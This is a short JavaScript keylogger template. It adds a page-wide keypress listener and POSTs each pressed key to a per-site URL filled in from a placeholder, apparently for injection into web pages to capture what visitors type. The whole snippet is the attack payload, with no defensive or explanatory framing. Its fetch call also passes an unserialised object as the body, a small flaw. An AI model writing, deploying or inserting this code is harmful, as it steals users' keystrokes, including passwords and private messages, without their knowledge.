// generate per site url
const url = __URL__  // placeholder to be replaced
// add listener
window.addEventListener('keypress', (ev)=>{
    sendKey(ev.key)
})
function sendKey(key){
    fetch(url, {
        method: 'POST',
        body: {
            key: key
        }
    })
}